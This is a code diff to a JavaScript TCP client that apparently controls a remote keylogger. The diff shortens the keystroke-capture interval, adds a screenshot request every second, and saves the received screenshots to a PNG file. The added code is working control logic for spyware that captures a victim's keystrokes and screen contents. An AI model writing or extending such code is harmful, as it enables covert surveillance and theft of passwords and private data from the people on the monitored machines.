@@ -49,7 +49,7 @@ class Client {
   }
 
   _onPacket (packet) {
-    console.log('>RECV>', packet)
+    // console.log('>RECV>', packet)
 
     if (packet.constructor === Packets.r_Hello) {
       let data = packet.data
@@ -102,10 +102,21 @@ var client = new Client()
 client.connect(41233, '127.0.0.1', 'Hello123', function(){
 
   console.log("CONNECT")
-  this._TCPclient.write(Packets.KeylogSetup.create({interval: 2000}))
+  this._TCPclient.write(Packets.KeylogSetup.create({interval: 1}))
   // this._TCPclient.write(Packets.KeylogSetup.create({interval: 0}))
 
+  setInterval(() => 
+    this._TCPclient.write(Packets.Screenshot.create()),
+  1000)
+
   this.on(Packets.r_Keylog, function(packet) {
-    console.log("Received key strokes:", String.fromCharCode(...packet.data));
+    console.log("Received key strokes:", String.fromCharCode(...packet.data).replace(/\r/g, "\\r").replace(/\n/g, "\\n"));
+  })
+
+  this.on(Packets.r_Screenshot, function(packet) {
+    console.log("Got screenshot")
+    let f = require('fs')
+    f.writeFileSync("recv.png", Buffer.from(packet.data.data))
+    console.log(typeof packet.data);
   })
 })
